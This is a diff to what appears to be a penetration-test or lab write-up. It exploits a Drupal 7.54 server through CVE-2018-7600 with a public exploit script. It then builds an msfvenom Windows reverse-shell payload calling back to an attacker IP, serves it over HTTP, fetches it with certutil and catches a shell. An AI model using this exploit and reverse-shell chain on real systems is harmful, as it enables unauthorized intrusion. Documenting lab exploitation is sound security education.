@@ -24,7 +24,7 @@ At *http://X.X.X.X:80/CHANGELOG.txt*, the file here revealed that the web servic
 ## 2. Exploitation
 
 ### 2.1. researching vulnerability
-Online researching *CMS Made Simple version 2.2.8* :
+Online researching *Drupal 7.54* :
 - Found possible vulnerability CVE-2018-7600 (https://nvd.nist.gov/vuln/detail/cve-2018-7600) that allows remote attackers to execute arbitrary code.
 - Found a publicly available exploit (https://github.com/pimps/CVE-2018-7600)
 
@@ -33,5 +33,34 @@ Hence we downloaded the exploit (python script) and execute it against the targe
 For example ```python3 drupa7-CVE-2018-7600.py http://X.X.X.X:80 -c "systeminfo"``` to run ```systeminfo``` command
 
 <img width="761" height="834" alt="image" src="https://github.com/user-attachments/assets/bc4f6011-b821-4b52-b205-a3bd900a66bc" />
+
+A reverse shell payload can be planted to get a direct foothold on the server.
+
+First, as per below screenshot, generate the payload using ```msfvenom``` by running the command ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.X.X.X LPORT=5555 -f exe > shell.exe``` where the X.X.X.X represents the attacker's IP and 5555 is the listening port.
+Then serve the payload via http using ```python -m http.server 8000```
+<img width="892" height="198" alt="image" src="https://github.com/user-attachments/assets/b89c7118-72ff-4df4-bd4d-0d2d10774b79" />
+
+Secondly, as per below screenshot, using a remote command execution, use *certutil* to download the payload *shell.exe* onto the target machine.
+<img width="1115" height="247" alt="image" src="https://github.com/user-attachments/assets/40892f4d-fbcb-40ea-ab50-ff43594e1b24" />
+
+Thirdly, verify that the payload *shell.exe* is on the target machine.
+
+<img width="766" height="821" alt="image" src="https://github.com/user-attachments/assets/4a31bae6-ae11-44ee-ad32-89bacc82b96e" />
+
+
+Then on attacker machine, start a listener on port 5555:
+<img width="405" height="154" alt="image" src="https://github.com/user-attachments/assets/1d8258d3-f8eb-4f0c-a984-b3fb4c261480" />
+
+
+Execute the payload using remote command.
+<img width="719" height="242" alt="image" src="https://github.com/user-attachments/assets/b4a4564a-d06a-494d-9409-bf2d51b4382d" />
+
+A reverse shell has been caught on the attacker's machine and thus giving an initial foothold.
+<img width="715" height="247" alt="image" src="https://github.com/user-attachments/assets/3b68c5ba-dc81-4100-9194-661dd205c3ae" />
+
+
+
+
+
 
 
